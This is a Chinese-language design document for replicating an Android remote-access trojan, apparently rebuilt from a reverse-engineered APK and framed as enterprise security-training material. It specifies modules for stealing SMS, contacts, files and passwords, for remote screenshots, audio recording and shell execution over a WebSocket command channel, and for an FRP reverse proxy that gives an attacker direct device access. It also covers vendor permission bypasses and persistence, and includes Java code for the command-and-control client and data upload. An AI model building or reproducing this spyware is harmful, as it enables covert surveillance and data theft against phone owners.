# Vendor APK Java 项目 — 需求与设计文档

> **版本**: 1.1
> **日期**: 2026-03-17
> **项目类型**: Android 分析与复刻
> **基于**: APK 逆向分析 + 网络协议还原
> **目标**: 构建功能完整的 Java Android 项目
> **构建状态**: ✅ BUILD SUCCESSFUL

---

## 一、项目概述

### 1.1 项目背景

基于对 Vendor APK（org.ldtape.qqlhl）的完整逆向分析，该项目旨在复刻其核心功能，用于企业安全培训靶场环境。

### 1.2 核心特性

| 功能模块 | 技术实现 | 复刻优先级 |
|---------|---------|-----------|
| 三层网络架构 | HTTP + WebSocket + FRP | ⭐⭐⭐⭐⭐ 极高 |
| UI 自动化框架 | AccessibilityService + UiObject | ⭐⭐⭐⭐⭐ 极高 |
| 厂商权限绕过 | 5 大厂商适配（小米/华为/OPPO/vivo/三星） | ⭐⭐⭐⭐ 高 |
| 数据窃取 | 短信/联系人/文件/密码 | ⭐⭐⭐⭐ 高 |
| 远程控制 | 截图/录音/屏幕监控 | ⭐⭐⭐ 中 |
| 保活机制 | 多进程守护 + 息屏唤醒 | ⭐⭐⭐ 中 |

### 1.3 技术约束

**必须遵守**：
- ✅ 仅用于企业内部安全培训
- ✅ 通过伦理审查和法律咨询
- ✅ 多层隔离，禁止访问外网
- ✅ 所有操作记录审计日志

---

## 二、网络架构设计

### 2.1 三层通信架构

```
┌─────────────────────────────────────────────────────────┐
│                    Android 客户端                        │
│  - MainApplication (应用入口)                            │
│  - MyAccessibilityService (无障碍服务)                  │
│  - NetworkManager (网络管理)                             │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│ 第 1 层: HTTP/HTTPS (数据上传)                          │
│  - 服务器: api.example.com:443                          │
│  - 协议: HTTP/1.1 over TLS 1.3                          │
│  - 用途: 上传短信/联系人/文件/密码                       │
│  - 库: OkHttp 4.12.0 + Conscrypt 2.5.2                  │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│ 第 2 层: WebSocket (实时命令)                           │
│  - 服务器: wss://api.example.com/bridge                 │
│  - 协议: WebSocket over TLS 1.3                         │
│  - 用途: 接收远程命令（截图/录音/控制）                  │
│  - 心跳: 30 秒间隔                                       │
│  - 库: OkHttp WebSocket                                  │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│ 第 3 层: FRP 反向代理（可选）                           │
│  - FRP 服务器: frp.example.com:7000                     │
│  - 本地 HTTP 服务器: 127.0.0.1:8080                     │
│  - 用途: 攻击者直接访问设备                              │
│  - 库: FRP 官方客户端（Go 编译为 .so）                   │
└─────────────────────────────────────────────────────────┘
```

### 2.2 网络层职责划分

| 层级 | 协议 | 方向 | 用途 | 频率 |
|------|------|------|------|------|
| Layer 1 | HTTPS | 客户端 → 服务器 | 数据上传 | 按需 |
| Layer 2 | WebSocket | 双向 | 命令推送 + 状态上报 | 实时 |
| Layer 3 | FRP + HTTP | 服务器 → 客户端 | 反向代理 | 按需 |

---

## 三、通信协议设计

### 3.1 HTTP API 设计

#### 3.1.1 数据上传接口

**端点**: `POST /api/v1/data/upload`

**请求头**:
```http
Content-Type: application/json
Authorization: Bearer {device_token}
X-Device-ID: {device_id}
X-App-Version: 1.0.0
```

**请求体**:
```json
{
  "type": "sms|contacts|files|passwords",
  "timestamp": 1710604800000,
  "data": {
    // 根据 type 不同，结构不同
  }
}
```

**响应**:
```json
{
  "code": 200,
  "message": "success",
  "data": {
    "uploaded": true,
    "id": "123456"
  }
}
```

#### 3.1.2 设备注册接口

**端点**: `POST /api/v1/device/register`

**请求体**:
```json
{
  "deviceId": "790694236383350784",
  "model": "Xiaomi 12",
  "androidVersion": "13",
  "manufacturer": "Xiaomi",
  "imei": "***",
  "phoneNumber": "***"
}
```

**响应**:
```json
{
  "code": 200,
  "message": "success",
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "wsUrl": "wss://api.example.com/bridge"
  }
}
```

### 3.2 WebSocket 协议设计

#### 3.2.1 消息格式

**客户端 → 服务器**:
```json
{
  "type": 1,  // 1=心跳, 2=状态上报, 3=命令响应
  "deviceId": "790694236383350784",
  "timestamp": 1710604800000,
  "body": {
    // 根据 type 不同
  }
}
```

**服务器 → 客户端**:
```json
{
  "type": 10,  // 10=截图, 11=录音, 12=文件下载, 15=发送消息
  "commandId": "cmd_123456",
  "body": {
    "bridgePath": "/cacheTask",
    "toDesktop": true,
    "buffer": "base64_encoded_data"
  }
}
```

#### 3.2.2 消息类型定义

| type | 方向 | 名称 | 说明 |
|------|------|------|------|
| 1 | C→S | HEARTBEAT | 心跳（30 秒间隔） |
| 2 | C→S | STATUS_REPORT | 状态上报（电量/网络/位置） |
| 3 | C→S | COMMAND_RESPONSE | 命令执行结果 |
| 10 | S→C | SCREENSHOT | 截图命令 |
| 11 | S→C | RECORD_AUDIO | 录音命令 |
| 12 | S→C | DOWNLOAD_FILE | 文件下载命令 |
| 13 | S→C | UPLOAD_FILE | 文件上传命令 |
| 14 | S→C | EXECUTE_SHELL | Shell 命令执行 |
| 15 | S→C | SEND_MESSAGE | 发送短信/消息 |

#### 3.2.3 心跳机制

```java
// 客户端每 30 秒发送心跳
{
  "type": 1,
  "deviceId": "790694236383350784",
  "timestamp": 1710604800000,
  "body": {
    "battery": 85,
    "network": "WiFi",
    "location": "39.9042,116.4074"
  }
}

// 服务器响应
{
  "type": 1,
  "code": 200,
  "message": "pong"
}
```

### 3.3 FRP 配置

**客户端配置** (`frpc.ini`):
```ini
[common]
server_addr = frp.example.com
server_port = 7000
token = your_secret_token

[http_proxy]
type = http
local_ip = 127.0.0.1
local_port = 8080
custom_domains = device-{device_id}.example.com
```

**本地 HTTP 服务器**:
- 监听：`127.0.0.1:8080`
- 用途：提供 RESTful API，供攻击者直接访问设备
- 端点：
  - `GET /api/screenshot` - 截图
  - `GET /api/files` - 文件列表
  - `POST /api/shell` - 执行命令

---

## 四、技术选型

### 4.1 开发环境

| 项目 | 选型 | 版本 |
|------|------|------|
| 开发环境 | WSL Ubuntu 22.04 | 命令行构建 |
| JDK | OpenJDK | 17 |
| 构建工具 | Gradle (wrapper) | 8.5 |
| AGP | Android Gradle Plugin | 8.2.2 |
| 平台 SDK | platforms;android-34 | API 34 |
| Build Tools | build-tools | 34.0.0 |
| 编程语言 | Java | 8+ (source compat) |
| 最低 SDK | Android 5.0 | API 21 |
| 目标 SDK | Android 14 | API 34 |

**环境路径**:
```bash
JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64
ANDROID_HOME=/opt/android-sdk
```

**日常开发命令**:
```bash
cd /home/code/php/project/full-package/android
./gradlew test              # 运行全部单元测试（日常使用）
./gradlew assembleDebug     # 构建 APK（真机测试时使用）
```

### 4.2 核心依赖

```gradle
dependencies {
    // Android 核心
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'androidx.core:core:1.12.0'

    // 网络通信
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'

    // TLS 1.3 支持
    implementation 'org.conscrypt:conscrypt-android:2.5.2'

    // JSON 序列化
    implementation 'com.google.code.gson:gson:2.10.1'

    // 单元测试
    testImplementation 'junit:junit:4.13.2'
    testImplementation 'org.mockito:mockito-core:5.3.1'
    testImplementation 'com.squareup.okhttp3:mockwebserver:4.12.0'
    testImplementation 'org.robolectric:robolectric:4.11.1'

    // Instrumentation 测试
    androidTestImplementation 'androidx.test.ext:junit:1.1.5'
    androidTestImplementation 'androidx.test.uiautomator:uiautomator:2.2.0'
}
```

### 4.3 权限清单

```xml
<!-- 网络权限 -->
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

<!-- 数据读取 -->
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />

<!-- 远程控制 -->
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />

<!-- 无障碍服务 -->
<uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />

<!-- 设备管理员 -->
<uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />

<!-- 前台服务 -->
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
```

---

## 五、模块设计

### 5.1 包结构（已实现）

```
android/                              # Android 项目根目录
├── build.gradle                      # 根构建脚本
├── settings.gradle                   # 项目设置
├── gradle.properties                 # Gradle 配置（含 WSL 优化）
├── local.properties                  # 本地 SDK 路径
├── gradlew / gradlew.bat             # Gradle wrapper
├── gradle/wrapper/
│   ├── gradle-wrapper.jar
│   └── gradle-wrapper.properties     # Gradle 8.5
└── app/
    ├── build.gradle                  # 应用构建脚本
    ├── proguard-rules.pro
    └── src/
        ├── main/
        │   ├── AndroidManifest.xml   # 20+ 权限 + 全部组件声明
        │   ├── assets/config.json    # 加密配置文件
        │   ├── res/                  # 资源文件
        │   │   ├── values/strings.xml, themes.xml
        │   │   ├── drawable/         # 图标资源
        │   │   └── xml/             # accessibility, device_admin, authenticator
        │   └── java/com/vendor/rat/  # 51 个 Java 源文件
        │       ├── MyApp.java                    # Application 入口
        │       ├── MainApplication.java          # 3-phase 初始化
        │       ├── ActivityLifecycleTracker.java
        │       ├── config/                       # 配置管理
        │       │   ├── AppConfig.java
        │       │   ├── ConfigDecryptor.java       # AES-128-ECB
        │       │   └── ApiEndpoints.java
        │       ├── network/                      # 模块 01
        │       │   ├── NetworkManager.java
        │       │   ├── HttpClient.java
        │       │   ├── WebSocketClient.java
        │       │   └── HttpCallback.java
        │       ├── service/                      # 模块 02
        │       │   ├── MyAccessibilityService.java
        │       │   ├── EngineManager.java
        │       │   └── AppDeviceAdminReceiver.java
        │       ├── auto/                         # 模块 03 + 04
        │       │   ├── entity/UiNode.java
        │       │   ├── filter/NodeFilter.java
        │       │   ├── condition/{String,Bool}Condition.java, CombineFilter.java
        │       │   └── engine/AutoEngine.java
        │       │       └── vendor/{Xiaomi,Huawei,Oppo,Vivo,Samsung}Engine.java
        │       ├── data/                         # 模块 05
        │       │   ├── collector/{DataCollectionManager,SmsReceiver,CallReceiver,LockCipherCollector}.java
        │       │   ├── observer/PhotoAlbumContentObserver.java
        │       │   └── queue/UploadQueue.java
        │       ├── control/                      # 模块 06
        │       │   ├── handler/{CommandDispatcher,Screenshot,AudioRecord,ShellCommand,FileTransfer}Handler.java
        │       │   └── service/MediaLiveService.java
        │       ├── keepalive/                    # 模块 07
        │       │   ├── KeepAliveManager.java
        │       │   ├── KeepAliveJobService.java
        │       │   ├── receiver/{Boot,ScreenBroadcast,Alarm,BatteryLevel}Receiver.java
        │       │   ├── thread/{Check,Heart}Thread.java
        │       │   └── service/{WIFIBackground,AccountAuthenticator}Service.java
        │       ├── activity/                     # 模块 08
        │       │   ├── ActivMain.java
        │       │   └── PermissionActivity.java
        │       ├── exception/GlobalExceptionHandler.java
        │       └── utils/{DeviceUtils,HiddenApiBypass}.java
        └── test/java/com/vendor/rat/             # 4 个单元测试
            ├── network/HttpClientTest.java
            ├── auto/NodeFilterTest.java
            ├── config/AppConfigTest.java
            └── utils/DeviceUtilsTest.java
```

### 5.2 核心类设计

#### 5.2.1 NetworkManager

```java
public class NetworkManager {
    private static NetworkManager instance;
    private HttpClient httpClient;
    private WebSocketClient wsClient;
    private FrpClient frpClient;

    public static NetworkManager getInstance() {
        if (instance == null) {
            synchronized (NetworkManager.class) {
                if (instance == null) {
                    instance = new NetworkManager();
                }
            }
        }
        return instance;
    }

    public void init(Context context) {
        httpClient = new HttpClient(context);
        wsClient = new WebSocketClient(context);
        frpClient = new FrpClient(context);
    }

    public void registerDevice(DeviceInfo info, Callback callback) {
        httpClient.post("/api/v1/device/register", info, callback);
    }

    public void connectWebSocket(String url, String token) {
        wsClient.connect(url, token);
    }

    public void uploadData(String type, Object data, Callback callback) {
        httpClient.post("/api/v1/data/upload",
            new UploadRequest(type, data), callback);
    }
}
```

#### 5.2.2 WebSocketClient

```java
public class WebSocketClient {
    private OkHttpClient client;
    private WebSocket webSocket;
    private Handler heartbeatHandler;

    public void connect(String url, String token) {
        Request request = new Request.Builder()
            .url(url)
            .addHeader("Authorization", "Bearer " + token)
            .build();

        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onMessage(WebSocket ws, String text) {
                handleMessage(text);
            }
        });

        startHeartbeat();
    }

    private void startHeartbeat() {
        heartbeatHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                sendHeartbeat();
                heartbeatHandler.postDelayed(this, 30000); // 30 秒
            }
        }, 30000);
    }

    private void sendHeartbeat() {
        Message msg = new Message();
        msg.type = 1; // HEARTBEAT
        msg.deviceId = DeviceUtils.getDeviceId();
        msg.timestamp = System.currentTimeMillis();
        msg.body = new HeartbeatBody();

        webSocket.send(new Gson().toJson(msg));
    }

    private void handleMessage(String text) {
        Message msg = new Gson().fromJson(text, Message.class);

        switch (msg.type) {
            case 10: // SCREENSHOT
                handleScreenshot(msg);
                break;
            case 11: // RECORD_AUDIO
                handleRecordAudio(msg);
                break;
            case 15: // SEND_MESSAGE
                handleSendMessage(msg);
                break;
        }
    }
}
```

#### 5.2.3 HttpClient

```java
public class HttpClient {
    private OkHttpClient client;
    private String baseUrl;
    private String deviceToken;

    public HttpClient(Context context) {
        // 启用 Conscrypt 支持 TLS 1.3
        Security.insertProviderAt(Conscrypt.newProvider(), 1);

        client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build();

        baseUrl = BuildConfig.API_BASE_URL;
    }

    public void post(String endpoint, Object data, Callback callback) {
        String json = new Gson().toJson(data);

        RequestBody body = RequestBody.create(
            json, MediaType.parse("application/json"));

        Request request = new Request.Builder()
            .url(baseUrl + endpoint)
            .addHeader("Authorization", "Bearer " + deviceToken)
            .addHeader("X-Device-ID", DeviceUtils.getDeviceId())
            .post(body)
            .build();

        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onResponse(Call call, Response response) {
                callback.onSuccess(response.body().string());
            }

            @Override
            public void onFailure(Call call, IOException e) {
                callback.onError(e);
            }
        });
    }
}
```

---

## 六、实施路线图

### Phase 1: 网络层实现（2 周）

| 任务 | 工作量 | 交付物 |
|------|--------|--------|
| HttpClient 实现 | 2 天 | HTTP 客户端 + 单元测试 |
| WebSocketClient 实现 | 3 天 | WebSocket 客户端 + 心跳机制 |
| NetworkManager 实现 | 2 天 | 网络管理器 + 重连逻辑 |
| 协议测试 | 2 天 | 集成测试 + Mock 服务器 |

### Phase 2: 数据收集（2 周）

| 任务 | 工作量 | 交付物 |
|------|--------|--------|
| SmsCollector | 1 天 | 短信收集 |
| ContactCollector | 1 天 | 联系人收集 |
| FileCollector | 2 天 | 文件收集 |
| DataUploader | 2 天 | 数据上传 + 加密 |

### Phase 3: 远程控制（2 周）

| 任务 | 工作量 | 交付物 |
|------|--------|--------|
| ScreenshotController | 2 天 | 截图功能 |
| AudioRecorder | 2 天 | 录音功能 |
| ShellExecutor | 1 天 | Shell 执行 |
| 命令分发器 | 2 天 | WebSocket 命令处理 |

### Phase 4: UI 自动化（3 周）

| 任务 | 工作量 | 交付物 |
|------|--------|--------|
| UiNode + UiNodeFinder | 3 天 | UI 自动化框架 |
| AutoEngine 基类 | 2 天 | 引擎基类 |
| 华为适配 | 3 天 | HuaweiEngine |
| 小米适配 | 3 天 | XiaomiEngine |
| OPPO 适配 | 3 天 | OppoEngine |

### Phase 5: 集成测试（1 周）

| 任务 | 工作量 | 交付物 |
|------|--------|--------|
| 单元测试 | 2 天 | JUnit 测试 |
| 集成测试 | 2 天 | 真机测试 |
| 性能优化 | 1 天 | 内存/电量优化 |

**总计**：10 周（2.5 个月）

---

## 七、安全与合规

### 7.1 法律合规

**必须完成**：
1. ✅ 伦理审查（IRB 批准）
2. ✅ 法律咨询（专业律师意见）
3. ✅ 免责声明（登录前强制阅读）
4. ✅ 访问控制（SSO + 2FA + IP 白名单）
5. ✅ 操作审计（Elasticsearch + Kibana）

### 7.2 技术隔离

**网络隔离**：
```yaml
# docker-compose.yml
services:
  android-vm:
    networks:
      - isolated_network
    cap_drop:
      - ALL
    security_opt:
      - no-new-privileges:true

networks:
  isolated_network:
    internal: true  # 禁止访问外网
```

**权限限制**：
- SELinux enforcing 模式
- AppArmor 配置
- 容器内禁止 root 权限

### 7.3 审计日志

所有操作记录到 Elasticsearch：
```json
{
  "timestamp": "2026-03-16T10:30:00Z",
  "user": "admin@example.com",
  "action": "execute_command",
  "target": "device_123456",
  "command": "screenshot",
  "result": "success",
  "ip": "192.168.1.100"
}
```

---

## 八、验收标准

### 8.1 功能验收

| 功能 | 验收标准 |
|------|---------|
| HTTP 通信 | 成功上传数据到服务器，响应时间 < 2 秒 |
| WebSocket 通信 | 心跳稳定，命令响应时间 < 1 秒 |
| 数据收集 | 成功收集短信/联系人/文件 |
| 远程控制 | 截图/录音功能正常 |
| UI 自动化 | 3 大厂商适配成功率 > 80% |

### 8.2 性能验收

| 指标 | 目标 |
|------|------|
| 内存占用 | < 50 MB |
| 电池消耗 | < 3%/小时 |
| APK 体积 | < 5 MB |
| 网络流量 | < 10 MB/天（正常使用） |

---

## 九、附录

### A. 参考文档

- [APK_VENDOR_REPLICATION_PLAN.md](./APK_VENDOR_REPLICATION_PLAN.md) - 功能复刻计划
- [APK_REPLICATION_FEASIBILITY_ASSESSMENT.md](../rathat/APK_REPLICATION_FEASIBILITY_ASSESSMENT.md) - 可行性评估

### B. 开源库

| 库 | 用途 | 许可证 |
|---|------|--------|
| OkHttp | HTTP/WebSocket 客户端 | Apache-2.0 |
| Gson | JSON 序列化 | Apache-2.0 |
| Conscrypt | TLS 1.3 支持 | Apache-2.0 |

---

**文档版本**: 1.1
**最后更新**: 2026-03-17
**作者**: 企业安全团队
